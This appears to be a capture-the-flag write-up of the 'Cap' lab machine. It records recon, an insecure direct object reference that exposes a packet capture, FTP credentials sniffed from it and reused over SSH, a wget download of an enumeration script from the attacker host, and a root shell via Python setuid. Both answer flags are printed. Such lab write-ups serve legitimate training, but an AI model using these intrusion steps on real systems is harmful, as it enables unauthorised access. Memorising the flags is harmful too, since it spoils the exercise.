# Flags
- User
	- 34034a18a7503210fe0cd579e9fdbef3
- Root
	- 3122db1f342573ed0d1913013d512e05


# Notes
- First, a rustscan:
```
rustscan --ulimit 5000 --addresses "10.129.2.14" --top -- -sC -sV
```
- We can see that 3 TCP ports are open: 21, 22, 80
- Navigating to the website, we are given a dashboard to work with.
- Exploring the tabs, we are able to see that they are stored under the /data/ directory, and their number represents the current user
- I am able to get different results by modifying the current user / the number
- From that, I was able to download the file of 0.pcap
- I can now open up that file in Wireshark and attempt to dig through it
- From this dump, I was able to find FTP packets, in which due to FTP doing everything in plain text, I was able to dig out the credentials of:
	- nathan:Buck3tH4TF0RM3!
- I also found out that these credentials also work over SSH, so I was able to login to the box as nathan.
- From here, I am able to navigate to his home folder and grab the user flag:
```
nathan@cap:~$ ls  
user.txt  
nathan@cap:~$ cat user.txt  
34034a18a7503210fe0cd579e9fdbef3
```
- Now, let's move onto privilege escalation.
- I tried to use the sudo -l command, but the nathan user is not in the sudoers file, so I was out of luck there.
- I will now attempt to get a copy of LinEnum onto the system and go from there:
```
nathan@cap:/tmp$ wget http://10.10.15.4:8000/LinEnum.sh  
--2026-01-27 05:22:21--  http://10.10.15.4:8000/LinEnum.sh  
Connecting to 10.10.15.4:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 46631 (46K) [text/x-sh]  
Saving to: ‘LinEnum.sh’  
  
LinEnum.sh                                                 100%[========================================================================================================================================>]  45.54K   242KB/s    in 0.2s       
  
2026-01-27 05:22:21 (242 KB/s) - ‘LinEnum.sh’ saved [46631/46631]  
  
nathan@cap:/tmp$ ls  
LinEnum.sh  systemd-private-fa9fa42de91d425a953aecb95ee1a02e-systemd-logind.service-OjQeZf    systemd-private-fa9fa42de91d425a953aecb95ee1a02e-systemd-timesyncd.service-2dKnbh  
snap.lxd    systemd-private-fa9fa42de91d425a953aecb95ee1a02e-systemd-resolved.service-x3qN2i  vmware-root_940-2689209484
```
- That worked, so now I will go ahead and run that
- From the results, we are able to see that we have a binary that we can use to abuse for root privileges:
```
...
/usr/bin/python3.8
...
```
- We are able to access python, so we can attempt to spawn a root shell using this:
```
nathan@cap:/tmp$ /usr/bin/python3.8  
Python 3.8.5 (default, Jan 27 2021, 15:41:15)    
[GCC 9.3.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import os;  
>>> os.system('/bin/bash')  
nathan@cap:/tmp$ whoami  
nathan  
nathan@cap:/tmp$ /usr/bin/python3.8  
Python 3.8.5 (default, Jan 27 2021, 15:41:15)    
[GCC 9.3.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import os;  
>>> os.setuid(0);  
>>> os.system("  
 File "<stdin>", line 1  
   os.system("  
             ^  
SyntaxError: EOL while scanning string literal  
>>> os.system("/bin/bash")  
root@cap:/tmp# whoami  
root
```
- Resource: https://privacyencrypt.com/blog/manual-privilege-escalation-using-python
- We are then able to get root!
- Now, we can finish up the box by navigating over to the root folder and grabbing the root flag out.
```
root@cap:/tmp# cd /root  
root@cap:/root# ls  
root.txt  snap  
root@cap:/root# cat root.txt    
3122db1f342573ed0d1913013d512e05
```
